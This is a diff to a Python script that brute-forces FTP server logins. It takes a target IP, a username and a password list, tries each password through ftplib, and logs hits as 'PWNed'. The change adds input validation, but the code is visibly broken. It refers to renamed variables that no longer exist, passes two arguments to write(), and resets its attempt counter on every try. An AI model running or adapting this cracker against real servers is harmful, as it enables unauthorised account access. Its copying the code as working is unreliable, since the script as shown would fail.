@@ -3,10 +3,12 @@
 import ftplib
 import os
 import datetime
+import sys
 import time
+import re
 import cowsay
 
-# constants
+# constants, global flag
 CWD = os.getcwd()
 FTPLOG = os.path.join(CWD, 'ftp_bruteforce.log')
 LOGHEADER = '''
@@ -16,7 +18,7 @@ LOGHEADER = '''
 *****************************************************
 
 '''
-isfound = False
+isFound = False
 
 # spinning timer
 def spin(found=False):
@@ -42,52 +44,71 @@ def spin(found=False):
                 print("\b" + spinner[spin % 4], end='', flush=True)
             print("\b*", end='', flush=True)
 
-# vars (modify for sys.argv instead/additionally!)
-server = input("Enter IP-Address of FTP server: ")
-print(server)
-
-user = input("Enter username to brute-force: ")
-print(user)
-
-passwd_list = input("Please provide path and filename of passwordlist: ")
-print(passwd_list)
-
-starttime = time.time()
-spin(isfound)
-print(f'*** Starting cracking process... ***\n')
-
-
+# vars (modify for sys.argv instead (or additionally)!)
 
 try:
-    with open(passwd_list, 'r') as passwords:
-        for password in passwords:
-            password = password.strip()
-            try:
-                tries = 0
-                ftp_con  = ftplib.FTP(server, user, password)
-                if ftp_con:
-                    print(f'''[+] Success! Connected to FTP server {server} with user {user}\
-                    and password {password} -- try #{tries})''')
+    while True:
+        SERVER = input("Enter IP-Address of FTP server: ")
+        REGEXP_IP = r'^\d{1,4}\.\d{1,4}\.\d{1,4}\.\d{1,4}$'
+        ip_re = re.compile(REGEXP_IP)
+        isIP = ip_re.search(SERVER)
 
-                    endtime = time.time()
-                    delta_time = endtime - starttime
-                    print(f'[…] Elapsed Time: {delta_time} seconds')
+        if isIP:
+            print(f"[+] Valid IP-Adress entered: {SERVER}\n")
+            break
+        else:
+            print(f"[-] INVALID IP! Please retry\n")
 
-                    CURRENT_TIME = datetime.datetime.now()
-                    LOGLINE = f'[+] PWNed! server: {server} with username: {user}\
-                    and password {password} (try #{tries} @ {CURRENT_TIME}\n'
+except EOFError:
+    sys.exit("Exiting script on behalf of user...")
 
-                    tries += 1
+USER = input("Enter username to brute-force: ")
+print(USER, "\n")
 
-                    if os.path.exists(FTPLOG):
-                        with open(FTPLOG, 'a+' ) as ftp_log:
-                            ftp_log.write(LOGLINE)
-                    else:
-                        with open(FTPLOG, 'w+') as ftp_log:
-                            ftp_log.write(LOGHEADER, LOGLINE)
-            except:
-                print(f'still trying... *** password: {password} *** try #{tries}\r', end='')
+try:
+    PASSWORD_LIST = input("Please provide path and filename of passwordlist: ")
+    print(PASSWORD_LIST)
 
+    if os.path.exists(PASSWORD_LIST):
+        print(f'*** Starting cracking process... ***\n')
+        starttime = time.time()
+        print(f'Progress: ')
+        spin(isfound)
+
+        with open(passwd_list, 'r') as passwords:
+            for password in passwords:
+                password = password.strip()
+                try:
+                    tries = 0
+                    ftp_con  = ftplib.FTP(server, user, password)
+                    if ftp_con:
+                        isfound = True
+
+                        print(f'''[+] Success! Connected to FTP server {server} with user {user}\
+                        and password {password} -- try #{tries})''')
+
+                        endtime = time.time()
+                        delta_time = endtime - starttime
+
+                        print(f'[…] Elapsed Time: {delta_time} seconds')
+
+                        CURRENT_TIME = datetime.datetime.now()
+                        LOGLINE = f'[+] PWNed! server: {server} with username: {user}\
+                        and password {password} (try #{tries} @ {CURRENT_TIME}\n'
+
+                        tries += 1
+
+                        if os.path.exists(FTPLOG):
+                            with open(FTPLOG, 'a+' ) as ftp_log:
+                                ftp_log.write(LOGLINE)
+                        else:
+                            with open(FTPLOG, 'w+') as ftp_log:
+                                ftp_log.write(LOGHEADER, LOGLINE)
+                except:
+                    print(f'still trying... *** password: {password} *** try #{tries}\r', end='')
+    else:
+        print(f'[-] No Password list exists at your specified location!\n')
+        raise FileExistsError
 except FileNotFoundError:
     print(f'[-] Sorry. Your password list could not be found at {passwd_list}!')
 finally:
